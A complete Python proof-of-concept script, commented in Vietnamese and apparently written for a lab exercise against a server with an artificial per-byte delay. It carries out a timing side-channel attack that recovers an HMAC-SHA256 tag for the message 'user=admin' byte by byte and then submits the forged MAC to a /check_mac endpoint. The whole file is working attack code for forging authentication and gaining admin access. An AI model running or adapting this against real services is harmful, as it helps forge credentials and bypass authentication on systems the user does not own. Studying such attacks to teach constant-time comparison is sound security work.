import requests
import time
import numpy as np

SERVER_URL = "http://server:5000"
MESSAGE = "user=admin"
MAC_LEN = 32 # SHA256 tạo ra 32 bytes
TIME_PER_BYTE = 0.005 # 5ms (phải khớp với giá trị sleep ở server)
REQUEST_COUNT = 3 # Số lần đo cho mỗi byte để lấy trung bình, chống nhiễu mạng

def check_mac_timing(message, mac_hex):
    """
    Gửi MAC đến server và trả về thời gian phản hồi (elapsed time).
    """
    payload = {
        'message': message,
        'mac': mac_hex
    }
    
    try:
        # Sử dụng perf_counter để có độ chính xác cao
        start_time = time.perf_counter()
        requests.post(f"{SERVER_URL}/check_mac", json=payload, timeout=5)
        end_time = time.perf_counter()
        
        return end_time - start_time
    except requests.exceptions.RequestException:
        return 0.0

def main():
    print("--- Timing Attack PoC (Attack B) ---")
    print(f"Attacking endpoint: {SERVER_URL}/check_mac")
    print(f"Target message: '{MESSAGE}'")
    print("Mục tiêu: Khôi phục MAC (32 bytes) byte-by-byte.")
    
    # Khởi tạo MAC rỗng (toàn byte 00)
    known_mac_bytes = bytearray(MAC_LEN)
    
    # Vòng lặp chính: khôi phục từng byte của MAC
    for i in range(MAC_LEN):
        print(f"\nĐang tìm byte thứ {i+1}/{MAC_LEN}...")
        
        # Lưu trữ thời gian đo được cho từng giá trị byte (0-255)
        timings = {}

        # Thử tất cả 256 giá trị
        for byte_val in range(256):
            # Tạo MAC_guess = [byte_đã_biết] + [byte_đang_thử] + [00...]
            known_mac_bytes[i] = byte_val
            guess_mac_hex = known_mac_bytes.hex()
            
            measured_times = []
            for _ in range(REQUEST_COUNT):
                 measured_times.append(check_mac_timing(MESSAGE, guess_mac_hex))
            
            # Lấy thời gian trung bình
            avg_time = np.mean(measured_times)
            timings[byte_val] = avg_time

        # Phân tích kết quả
        # Sắp xếp các byte theo thời gian phản hồi, từ cao đến thấp
        sorted_timings = sorted(timings.items(), key=lambda item: item[1], reverse=True)
        
        # Giá trị byte có thời gian phản hồi lâu nhất là byte đúng
        best_byte, max_time = sorted_timings[0]
        
        print(f"  => Byte {i} tìm thấy: {hex(best_byte)} (thời gian: {max_time:.4f}s)")
        known_mac_bytes[i] = best_byte

        # Kiểm tra nhanh: nếu thời gian trung bình không tăng
        expected_min_time = TIME_PER_BYTE * (i + 1)
        if max_time < expected_min_time * 0.8: # Cho phép sai số 20%
             print(f"  [!] Cảnh báo: Thời gian đo được ({max_time:.4f}s) ")
             print(f"      thấp hơn dự kiến ({expected_min_time:.4f}s).")
             print(f"      Kiểm tra lại server, giảm nhiễu mạng hoặc tăng REQUEST_COUNT.")

    
    print("\n--- TẤN CÔNG HOÀN TẤT ---")
    final_mac = known_mac_bytes.hex()
    print(f"  MAC khôi phục được: {final_mac}")
    
    # Bước cuối: Gửi MAC đầy đủ để xác nhận
    print("  Đang gửi MAC vừa tìm được để xác thực...")
    response = requests.post(
        f"{SERVER_URL}/check_mac", 
        json={'message': MESSAGE, 'mac': final_mac}
    )
    
    if response.status_code == 200:
        print("  => THÀNH CÔNG! Server đã chấp nhận MAC.")
    else:
        print(f"  => THẤT BẠI! Server từ chối MAC. {response.text}")


if __name__ == "__main__":
    main()

